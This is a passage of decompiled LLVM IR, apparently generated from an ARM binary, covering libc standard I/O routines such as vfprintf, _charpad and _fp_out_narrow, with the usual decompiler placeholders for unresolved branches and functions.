  store i32 104, i32* %r8.global-to-local, align 4
  %v1_24310 = inttoptr i32 %v4_24308 to i32*
  %v2_24310 = load i32, i32* %v1_24310, align 4
  store i32 %v2_24310, i32* @r4, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  %v1_2435c5 = add i32 %v2_24310, 56
  store i32 %v1_2435c5, i32* @r5, align 4
  %v2_243607 = icmp eq i32 %v2_24310, 0
  store i32 %v1_2435c5, i32* %r0.global-to-local, align 4
  br i1 %v2_243607, label %dec_label_pc_2436c, label %dec_label_pc_2431c

dec_label_pc_2431c:                               ; preds = %entry, %dec_label_pc_24350.dec_label_pc_2431c_crit_edge
  %v1_2431c = phi i32 [ %v1_2431c.pre, %dec_label_pc_24350.dec_label_pc_2431c_crit_edge ], [ 104, %entry ]
  %v0_2431c = phi i32 [ %v0_24370.pre, %dec_label_pc_24350.dec_label_pc_2431c_crit_edge ], [ %v0_24308, %entry ]
  %v2_2431c = add i32 %v0_2431c, %v1_2431c
  %v3_2431c = inttoptr i32 %v2_2431c to i32*
  %v4_2431c = load i32, i32* %v3_2431c, align 4
  store i32 %v4_2431c, i32* @ip, align 4
  store i32 148264, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_2431c)
  %v0_24328 = load i32, i32* %r0.global-to-local, align 4
  %v2_24328 = icmp eq i32 %v0_24328, 0
  %v0_2432c = load i32, i32* @r5, align 4
  store i32 %v0_2432c, i32* @r0, align 4
  br i1 %v2_24328, label %dec_label_pc_24350, label %dec_label_pc_24334

dec_label_pc_24334:                               ; preds = %dec_label_pc_2431c
  %v0_24334 = load i32, i32* @r4, align 4
  %v1_24334 = add i32 %v0_24334, 8
  %v2_24334 = inttoptr i32 %v1_24334 to i32*
  %v3_24334 = load i32, i32* %v2_24334, align 4
  store i32 %v3_24334, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v2_2433c = add i32 %v0_24334, 20
  %v3_2433c = inttoptr i32 %v2_2433c to i32*
  store i32 %v3_24334, i32* %v3_2433c, align 4
  %v0_24340 = load i32, i32* %r2.global-to-local, align 4
  %v1_24340 = trunc i32 %v0_24340 to i16
  %v2_24340 = load i32, i32* @r4, align 4
  %v3_24340 = inttoptr i32 %v2_24340 to i16*
  store i16 %v1_24340, i16* %v3_24340, align 2
  %v0_24344 = load i32, i32* %r3.global-to-local, align 4
  %v1_24344 = load i32, i32* @r4, align 4
  %v2_24344 = add i32 %v1_24344, 24
  %v3_24344 = inttoptr i32 %v2_24344 to i32*
  store i32 %v0_24344, i32* %v3_24344, align 4
  %v0_24348 = load i32, i32* %r3.global-to-local, align 4
  %v1_24348 = load i32, i32* @r4, align 4
  %v2_24348 = add i32 %v1_24348, 28
  %v3_24348 = inttoptr i32 %v2_24348 to i32*
  store i32 %v0_24348, i32* %v3_24348, align 4
  %v0_2434c = load i32, i32* %r3.global-to-local, align 4
  %v1_2434c = load i32, i32* @r4, align 4
  %v2_2434c = add i32 %v1_2434c, 16
  %v3_2434c = inttoptr i32 %v2_2434c to i32*
  store i32 %v0_2434c, i32* %v3_2434c, align 4
  br label %dec_label_pc_24350

dec_label_pc_24350:                               ; preds = %dec_label_pc_2431c, %dec_label_pc_24334
  %v0_24350 = load i32, i32* %r7.global-to-local, align 4
  %v1_24350 = load i32, i32* @r4, align 4
  %v2_24350 = add i32 %v1_24350, 52
  %v3_24350 = inttoptr i32 %v2_24350 to i32*
  store i32 %v0_24350, i32* %v3_24350, align 4
  %v1_24354 = call i32 @__stdio_init_mutex(i32 %v0_2432c)
  store i32 %v1_24354, i32* %r0.global-to-local, align 4
  %v0_24358 = load i32, i32* @r4, align 4
  %v1_24358 = add i32 %v0_24358, 32
  %v2_24358 = inttoptr i32 %v1_24358 to i32*
  %v3_24358 = load i32, i32* %v2_24358, align 4
  store i32 %v3_24358, i32* @r4, align 4
  %v1_2435c = add i32 %v3_24358, 56
  store i32 %v1_2435c, i32* @r5, align 4
  %v2_24360 = icmp eq i32 %v3_24358, 0
  store i32 %v1_2435c, i32* %r0.global-to-local, align 4
  %v0_24370.pre = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_24360, label %dec_label_pc_2436c, label %dec_label_pc_24350.dec_label_pc_2431c_crit_edge

dec_label_pc_24350.dec_label_pc_2431c_crit_edge:  ; preds = %dec_label_pc_24350
  %v1_2431c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_2431c

dec_label_pc_2436c:                               ; preds = %dec_label_pc_24350, %entry
  %v1_2439c14 = phi i32 [ %v1_2435c5, %entry ], [ %v1_2435c, %dec_label_pc_24350 ]
  %v0_24370 = phi i32 [ %v0_24308, %entry ], [ %v0_24370.pre, %dec_label_pc_24350 ]
  store i32 108, i32* %r3.global-to-local, align 4
  %v2_24370 = add i32 %v0_24370, 108
  %v3_24370 = inttoptr i32 %v2_24370 to i32*
  %v4_24370 = load i32, i32* %v3_24370, align 4
  store i32 %v4_24370, i32* %r3.global-to-local, align 4
  %storemerge.in1 = inttoptr i32 %v4_24370 to i32*
  %storemerge2 = load i32, i32* %storemerge.in1, align 4
  store i32 %storemerge2, i32* %r4.global-to-local, align 4
  %v2_243904 = icmp eq i32 %storemerge2, 0
  br i1 %v2_243904, label %dec_label_pc_24398, label %dec_label_pc_2437c

dec_label_pc_2437c:                               ; preds = %dec_label_pc_2436c, %dec_label_pc_24390
  %v1_24384 = phi i32 [ %storemerge, %dec_label_pc_24390 ], [ %storemerge2, %dec_label_pc_2436c ]
  %v1_2437c = inttoptr i32 %v1_24384 to i16*
  %v2_2437c = load i16, i16* %v1_2437c, align 2
  %v3_2437c = zext i16 %v2_2437c to i32
  store i32 %v3_2437c, i32* %r3.global-to-local, align 4
  %v1_24380 = and i32 %v3_2437c, 64
  %v2_24380 = icmp eq i32 %v1_24380, 0
  br i1 %v2_24380, label %dec_label_pc_24390, label %bb

bb:                                               ; preds = %dec_label_pc_2437c
  store i32 %v1_24384, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_24390

dec_label_pc_24390:                               ; preds = %dec_label_pc_2437c, %bb
  %v1_24388 = xor i1 %v2_24380, true
  call void @__pseudo_cond_branch(i1 %v1_24388, i32 ptrtoint (i32* @global_var_243b4.1621 to i32))
  %v0_2438c = load i32, i32* %r4.global-to-local, align 4
  %v1_2438c = add i32 %v0_2438c, 32
  %storemerge.in = inttoptr i32 %v1_2438c to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v2_24390 = icmp eq i32 %storemerge, 0
  br i1 %v2_24390, label %dec_label_pc_24390.dec_label_pc_24398_crit_edge, label %dec_label_pc_2437c

dec_label_pc_24390.dec_label_pc_24398_crit_edge:  ; preds = %dec_label_pc_24390
  %v1_2439c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_24398

dec_label_pc_24398:                               ; preds = %dec_label_pc_24390.dec_label_pc_24398_crit_edge, %dec_label_pc_2436c
  %v1_2439c = phi i32 [ %v1_2439c.pre, %dec_label_pc_24390.dec_label_pc_24398_crit_edge ], [ %v1_2439c14, %dec_label_pc_2436c ]
  %v2_24398 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_24398, i32* %r4.global-to-local, align 4
  ret i32 %v1_2439c

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_24308, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 5, 3, 0, 6, 7 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_24390, { 1, 0 }
  uselistorder label %dec_label_pc_2437c, { 1, 0 }
  uselistorder label %dec_label_pc_24350, { 1, 0 }
  uselistorder label %dec_label_pc_2431c, { 1, 0 }
}

define i32 @function_243a4(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_243a4:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_243a4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_243a4, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_243a4
  %v3_243a4 = udiv i32 %tmp, 2
  %v4_243a4 = shl i32 %tmp, 31
  %v5_243a4 = or i32 %v3_243a4, %v4_243a4
  %v8_243a4 = and i32 %v5_243a4, %tmp
  store i32 %v8_243a4, i32* %r0.global-to-local, align 4
  %v4_243a8 = inttoptr i32 %v8_243a4 to i32*
  store i32 %v8_243a4, i32* %v4_243a8, align 4
  %v5_243a8 = load i32, i32* @r8, align 4
  %v6_243a8 = load i32, i32* %r0.global-to-local, align 4
  %v7_243a8 = sub i32 %v6_243a8, %v5_243a8
  %v2_243ac = load i32, i32* @ip, align 4
  %v4_243ac = and i32 %v7_243a8, %v5_243a8
  %v4_243b0 = and i32 %v4_243ac, %v2_243ac
  store i32 %v4_243b0, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_243a4, %bb
  %v5_243b0 = phi i32 [ %tmp, %dec_label_pc_243a4 ], [ %v4_243b0, %bb ]
  ret i32 %v5_243b0

; uselistorder directives
  uselistorder i32 %tmp, { 2, 1, 3, 0, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_243b4 = load i32, i32* @r4, align 4
  store i32 %v3_243b4, i32* %stack_var_-8, align 4
  %v0_243b8 = load i32, i32* @r0, align 4
  %v1_243b8 = add i32 %v0_243b8, 8
  %v2_243b8 = inttoptr i32 %v1_243b8 to i32*
  %v3_243b8 = load i32, i32* %v2_243b8, align 4
  %v1_243bc = add i32 %v0_243b8, 16
  %v2_243bc = inttoptr i32 %v1_243bc to i32*
  %v3_243bc = load i32, i32* %v2_243bc, align 4
  %v9_243c0 = icmp eq i32 %v3_243bc, %v3_243b8
  store i32 %v0_243b8, i32* %r4.global-to-local, align 4
  br i1 %v9_243c0, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_243b8, i32* %v2_243bc, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_243cc = xor i1 %v9_243c0, true
  call void @__pseudo_cond_branch(i1 %v1_243cc, i32 ptrtoint (i32* @global_var_2c524.1622 to i32))
  %v0_243d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_243d0 = add i32 %v0_243d0, 8
  %v2_243d0 = inttoptr i32 %v1_243d0 to i32*
  %v3_243d0 = load i32, i32* %v2_243d0, align 4
  %v1_243d4 = add i32 %v0_243d0, 16
  %v2_243d4 = inttoptr i32 %v1_243d4 to i32*
  %v3_243d4 = load i32, i32* %v2_243d4, align 4
  %v2_243d8 = sub i32 %v3_243d4, %v3_243d0
  %v2_243dc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_243dc, i32* @r4, align 4
  ret i32 %v2_243d8

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_vfprintf() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_243e4 = load i32, i32* @r4, align 4
  store i32 %v3_243e4, i32* %stack_var_-28, align 4
  %v6_243e4 = load i32, i32* @r5, align 4
  %v9_243e4 = load i32, i32* @r6, align 4
  %v12_243e4 = load i32, i32* @r7, align 4
  %v15_243e4 = load i32, i32* @r8, align 4
  %v0_243e8 = load i32, i32* @r0, align 4
  %v1_243e8 = add i32 %v0_243e8, 52
  %v2_243e8 = inttoptr i32 %v1_243e8 to i32*
  %v3_243e8 = load i32, i32* %v2_243e8, align 4
  %v1_243f0 = sub i32 1, %v3_243e8
  %v2_243f0 = icmp ult i32 %v3_243e8, 2
  br i1 %v2_243f0, label %bb15, label %bb

bb:                                               ; preds = %entry
  br label %bb15

bb15:                                             ; preds = %entry, %bb
  %storemerge20 = phi i32 [ 0, %bb ], [ %v1_243f0, %entry ]
  %v0_243f8 = phi i32 [ 0, %bb ], [ %v1_243f0, %entry ]
  store i32 %storemerge20, i32* @r7, align 4
  %v2_243f8 = icmp eq i32 %v0_243f8, 0
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r6, align 4
  store i32 %v0_243e8, i32* @r5, align 4
  %v0_24408 = load i32, i32* @r1, align 4
  store i32 %v0_24408, i32* @sl, align 4
  %v0_2440c = load i32, i32* @r2, align 4
  store i32 %v0_2440c, i32* @r8, align 4
  br i1 %v2_243f8, label %dec_label_pc_2444c, label %dec_label_pc_24414

dec_label_pc_24414:                               ; preds = %bb15
  %v1_24418 = add i32 %v0_243e8, 56
  store i32 %v1_24418, i32* @r4, align 4
  %v4_2442c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 164) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_2442c)
  %v0_24440 = load i32, i32* @r6, align 4
  %v2_24440 = add i32 %v0_24440, 36
  %v3_24440 = inttoptr i32 %v2_24440 to i32*
  %v4_24440 = load i32, i32* %v3_24440, align 4
  store i32 %v4_24440, i32* @ip, align 4
  store i32 148556, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_24440)
  %v0_2444c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_2444c

dec_label_pc_2444c:                               ; preds = %bb15, %dec_label_pc_24414
  %v0_2445c = phi i32 [ %v0_243e8, %bb15 ], [ %v0_2444c.pre, %dec_label_pc_24414 ]
  %v1_2444c = inttoptr i32 %v0_2445c to i16*
  %v2_2444c = load i16, i16* %v1_2444c, align 2
  %v1_24450 = and i16 %v2_2444c, 192
  %v2_24454 = icmp eq i16 %v1_24450, 192
  br i1 %v2_24454, label %dec_label_pc_24474, label %dec_label_pc_2445c

dec_label_pc_2445c:                               ; preds = %dec_label_pc_2444c
  %v3_24464 = call i32 @__stdio_trans2w_o(i16* %v1_2444c, i32 128)
  %v2_24468 = icmp eq i32 %v3_24464, 0
  br i1 %v2_24468, label %dec_label_pc_2445c.dec_label_pc_24474_crit_edge, label %dec_label_pc_24488

dec_label_pc_2445c.dec_label_pc_24474_crit_edge:  ; preds = %dec_label_pc_2445c
  %v0_24474.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_24474

dec_label_pc_24474:                               ; preds = %dec_label_pc_2445c.dec_label_pc_24474_crit_edge, %dec_label_pc_2444c
  %v0_24474 = phi i32 [ %v0_24474.pre, %dec_label_pc_2445c.dec_label_pc_24474_crit_edge ], [ %v0_2445c, %dec_label_pc_2444c ]
  %v0_24478 = load i32, i32* @sl, align 4
  %v0_2447c = load i32, i32* @r8, align 4
  %v3_24480 = inttoptr i32 %v0_24478 to i8*
  %v4_24480 = call i32 @_vfprintf_internal(i32 %v0_24474, i8* %v3_24480, i32 %v0_2447c)
  br label %dec_label_pc_24488

dec_label_pc_24488:                               ; preds = %dec_label_pc_2445c, %dec_label_pc_24474
  %storemerge = phi i32 [ %v4_24480, %dec_label_pc_24474 ], [ -1, %dec_label_pc_2445c ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v0_24488 = load i32, i32* @r7, align 4
  %v2_24488 = icmp eq i32 %v0_24488, 0
  br i1 %v2_24488, label %dec_label_pc_24488..thread4_crit_edge, label %bb17

dec_label_pc_24488..thread4_crit_edge:            ; preds = %dec_label_pc_24488
  br label %.thread4

bb17:                                             ; preds = %dec_label_pc_24488
  %v1_24498 = load i32, i32* @r6, align 4
  %v3_24498 = add i32 %v1_24498, 76
  %v4_24498 = inttoptr i32 %v3_24498 to i32*
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_24488..thread4_crit_edge, %bb17
  %v0_244a0.in = phi i32* [ @ip, %dec_label_pc_24488..thread4_crit_edge ], [ %v4_24498, %bb17 ]
  %v0_244a0 = load i32, i32* %v0_244a0.in, align 4
  %v2_244a0 = xor i1 %v2_24488, true
  call void @__pseudo_cond_branch(i1 %v2_244a0, i32 %v0_244a0)
  %v0_244a4 = load i32, i32* %r4.global-to-local, align 4
  %v2_244ac = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_244ac, i32* @r4, align 4
  store i32 %v6_243e4, i32* @r5, align 4
  store i32 %v9_243e4, i32* @r6, align 4
  store i32 %v12_243e4, i32* @r7, align 4
  store i32 %v15_243e4, i32* @r8, align 4
  ret i32 %v0_244a4

; uselistorder directives
  uselistorder i32 %v3_243e8, { 1, 0 }
  uselistorder i32 (i32, i8*, i32)* @_vfprintf_internal, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_24488, { 1, 0 }
  uselistorder label %dec_label_pc_2444c, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @function_244b8(i32 %arg1) local_unnamed_addr {
dec_label_pc_244b8:
  %v0_244b8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_244b8, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_244b8
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_244b8, %bb
  %v4_244c4 = phi i32 [ %arg1, %dec_label_pc_244b8 ], [ 0, %bb ]
  ret i32 %v4_244c4

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-25 = alloca i8, align 1
  %v3_244c8 = load i32, i32* @r4, align 4
  %v6_244c8 = load i32, i32* @r5, align 4
  %v9_244c8 = load i32, i32* @r6, align 4
  %v12_244c8 = load i32, i32* @r7, align 4
  store i8 %arg2, i8* %stack_var_-25, align 1
  %v10_244d4 = ptrtoint i8* %stack_var_-25 to i32
  store i32 %v10_244d4, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %v2_244ec2 = icmp eq i32 %arg3, 0
  br i1 %v2_244ec2, label %dec_label_pc_2450c, label %dec_label_pc_24500

dec_label_pc_244e8:                               ; preds = %dec_label_pc_24500
  %v1_244e8 = add i32 %v0_244e8, -1
  store i32 %v1_244e8, i32* @r4, align 4
  %v2_244ec = icmp eq i32 %v1_244e8, 0
  %v0_244f8 = load i32, i32* @r7, align 4
  br i1 %v2_244ec, label %dec_label_pc_2450c.loopexit, label %dec_label_pc_24500

dec_label_pc_24500:                               ; preds = %entry, %dec_label_pc_244e8
  %v0_244f84 = phi i32 [ %v0_244f8, %dec_label_pc_244e8 ], [ %arg1, %entry ]
  %v3_24500 = inttoptr i32 %v0_244f84 to i16*
  %v4_24500 = call i32 @__stdio_fwrite(i32 %v10_244d4, i32 1, i16* %v3_24500)
  %v7_24504 = icmp eq i32 %v4_24500, 1
  %v0_244e8 = load i32, i32* @r4, align 4
  br i1 %v7_24504, label %dec_label_pc_244e8, label %dec_label_pc_2450c.loopexit

dec_label_pc_2450c.loopexit:                      ; preds = %dec_label_pc_244e8, %dec_label_pc_24500
  %v0_2450c.ph = phi i32 [ %v0_244e8, %dec_label_pc_24500 ], [ 0, %dec_label_pc_244e8 ]
  %v1_2450c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_2450c

dec_label_pc_2450c:                               ; preds = %dec_label_pc_2450c.loopexit, %entry
  %v1_2450c = phi i32 [ 0, %entry ], [ %v1_2450c.pre, %dec_label_pc_2450c.loopexit ]
  %v0_2450c = phi i32 [ 0, %entry ], [ %v0_2450c.ph, %dec_label_pc_2450c.loopexit ]
  %v2_2450c = sub i32 %v1_2450c, %v0_2450c
  store i32 %v3_244c8, i32* @r4, align 4
  store i32 %v6_244c8, i32* @r5, align 4
  store i32 %v9_244c8, i32* @r6, align 4
  store i32 %v12_244c8, i32* @r7, align 4
  ret i32 %v2_2450c

; uselistorder directives
  uselistorder i32 %v1_244e8, { 1, 0 }
  uselistorder label %dec_label_pc_2450c.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_24500, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_2451c = load i32, i32* @r4, align 4
  store i32 %v3_2451c, i32* %stack_var_-24, align 4
  %v6_2451c = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v1_24524 = and i32 %arg2, 128
  %v2_24524 = icmp eq i32 %v1_24524, 0
  %v0_24528 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_24528, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_24524, label %dec_label_pc_24578thread-pre-split, label %dec_label_pc_2453c

dec_label_pc_2453c:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_24540 = call i32 @strlen(i8* %arg4)
  store i32 %v3_24540, i32* %r0.global-to-local, align 4
  %v1_24544 = load i32, i32* %r4.global-to-local, align 4
  %v2_24544 = sub i32 %v1_24544, %v3_24540
  store i32 %v2_24544, i32* @r4, align 4
  store i32 %v3_24540, i32* @r6, align 4
  %tmp13 = icmp slt i32 %v2_24544, 1
  br i1 %tmp13, label %.thread, label %dec_label_pc_24558

.thread:                                          ; preds = %dec_label_pc_2453c
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_24574

dec_label_pc_24558:                               ; preds = %dec_label_pc_2453c
  %v0_24558 = load i32, i32* @r5, align 4
  %v1_24558 = urem i32 %v0_24558, 128
  %v0_2455c = load i32, i32* @r8, align 4
  store i32 %v0_2455c, i32* %r0.global-to-local, align 4
  %v3_24564 = trunc i32 %v1_24558 to i8
  %v4_24564 = call i32 @_charpad(i32 %v0_2455c, i8 %v3_24564, i32 %v2_24544)
  store i32 %v4_24564, i32* %r0.global-to-local, align 4
  %v1_24568 = load i32, i32* @r4, align 4
  %v9_24568 = icmp eq i32 %v4_24564, %v1_24568
  store i32 %v4_24564, i32* %r5.global-to-local, align 4
  br i1 %v9_24568, label %dec_label_pc_24558.dec_label_pc_24574_crit_edge, label %dec_label_pc_24594

dec_label_pc_24558.dec_label_pc_24574_crit_edge:  ; preds = %dec_label_pc_24558
  %v0_24574.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_24574

dec_label_pc_24574:                               ; preds = %.thread, %dec_label_pc_24558.dec_label_pc_24574_crit_edge
  %v0_24574 = phi i32 [ %v0_24574.pre, %dec_label_pc_24558.dec_label_pc_24574_crit_edge ], [ %v3_24540, %.thread ]
  store i32 %v0_24574, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_24578

dec_label_pc_24578thread-pre-split:               ; preds = %entry
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_24578

dec_label_pc_24578:                               ; preds = %dec_label_pc_24578thread-pre-split, %dec_label_pc_24574
  %v5_24584 = phi i32 [ %arg3, %dec_label_pc_24578thread-pre-split ], [ %v0_24574, %dec_label_pc_24574 ]
  %tmp14 = icmp slt i32 %v5_24584, 1
  br i1 %tmp14, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_24578
  br label %bb15

bb:                                               ; preds = %dec_label_pc_24578
  %v5_24580 = load i32, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %.thread5, %bb
  %storemerge = phi i32 [ 0, %.thread5 ], [ %v5_24580, %bb ]
  %tmp16 = phi i1 [ false, %.thread5 ], [ true, %bb ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp16, i32 ptrtoint (i32* @global_var_2c5d8.1628 to i32))
  %v0_24590 = load i32, i32* %r5.global-to-local, align 4
  %v2_24590 = add i32 %storemerge, %v0_24590
  store i32 %v2_24590, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_24594

dec_label_pc_24594:                               ; preds = %dec_label_pc_24558, %bb15
  %v0_24594 = phi i32 [ %v4_24564, %dec_label_pc_24558 ], [ %v2_24590, %bb15 ]
  store i32 %v0_24594, i32* %r0.global-to-local, align 4
  %v2_24598 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_24598, i32* %r4.global-to-local, align 4
  store i32 %v6_2451c, i32* %r5.global-to-local, align 4
  ret i32 %v0_24594

; uselistorder directives
  uselistorder i32 %v0_24594, { 1, 0 }
  uselistorder i32 %v0_24574, { 1, 0 }
  uselistorder i32 %v2_24544, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 7, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_24594, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_24574, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp98 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i8 @__decompiler_undefined_function_4()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i32 @__decompiler_undefined_function_0()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %tmp106 = call i8 @__decompiler_undefined_function_4()
  %tmp107 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %v6_245a0 = load i32, i32* @r5, align 4
  %v9_245a0 = load i32, i32* @r6, align 4
  %v12_245a0 = load i32, i32* @r7, align 4
  %v18_245a0 = load i32, i32* @sb, align 4
  %v21_245a0 = load i32, i32* @sl, align 4
  %v24_245a0 = load i32, i32* @fp, align 4
  %v2_245a8 = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_245a8, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_245a8, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_245b8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_245b8, i32* @r5, align 4
  %v2_245bc = call i32 @_ppfs_init(i32* nonnull %stack_var_-352)
  store i32 %v2_245bc, i32* %r0.global-to-local, align 4
  %v1_245c4 = icmp slt i32 %v2_245bc, 0
  br i1 %v1_245c4, label %dec_label_pc_245d4, label %dec_label_pc_24608

dec_label_pc_245d4:                               ; preds = %entry
  %v3_245d4 = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_245d4, i32* @r4, align 4
  %v1_245d8 = inttoptr i32 %v3_245d4 to i8*
  store i32 %v3_245d4, i32* %r0.global-to-local, align 4
  %v3_245dc = call i32 @strlen(i8* %v1_245d8)
  store i32 %v3_245dc, i32* %r0.global-to-local, align 4
  %v2_245e0 = icmp eq i32 %v3_245dc, 0
  br i1 %v2_245e0, label %bb, label %dec_label_pc_245f0

bb:                                               ; preds = %dec_label_pc_245d4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_24c58

dec_label_pc_245f0:                               ; preds = %dec_label_pc_245d4
  %v0_245f0 = load i32, i32* @r4, align 4
  store i32 %v0_245f0, i32* %r0.global-to-local, align 4
  %v0_245f4 = load i32, i32* @fp, align 4
  store i32 %v0_245f4, i32* %r2.global-to-local, align 4
  %v3_245f8 = inttoptr i32 %v0_245f4 to i16*
  %v4_245f8 = call i32 @__stdio_fwrite(i32 %v0_245f0, i32 %v3_245dc, i16* %v3_245f8)
  store i32 %v4_245f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_24c58

dec_label_pc_24608:                               ; preds = %entry
  %v0_24608 = load i32, i32* @r5, align 4
  store i32 %v2_245a8, i32* %r0.global-to-local, align 4
  %v2_24610 = call i32 @_ppfs_prepargs(i32 %v2_245a8, i32 %v0_24608)
  store i32 %v2_24610, i32* %r0.global-to-local, align 4
  store i32 20564, i32* @ip, align 4
  %v0_24658 = load i32, i32* @r4, align 4
  store i32 %v0_24658, i32* %r2.global-to-local, align 4
  %v1_246dc = bitcast i32* %stack_var_-352 to i8*
  %v4_246ec = zext i8 %tmp106 to i32
  %tmp137 = icmp slt i32 %tmp107, 1
  %v7_246f8 = ptrtoint i32* %stack_var_-272 to i32
  %v2_24710 = ptrtoint i32* %stack_var_-40 to i32
  %v2_2472c = icmp eq i32 %tmp104, 0
  %v2_24a64 = ptrtoint i32* %stack_var_-200 to i32
  %v2_24aa8 = ptrtoint i32* %stack_var_-348 to i32
  %v2_24aac = ptrtoint i32* %stack_var_-72 to i32
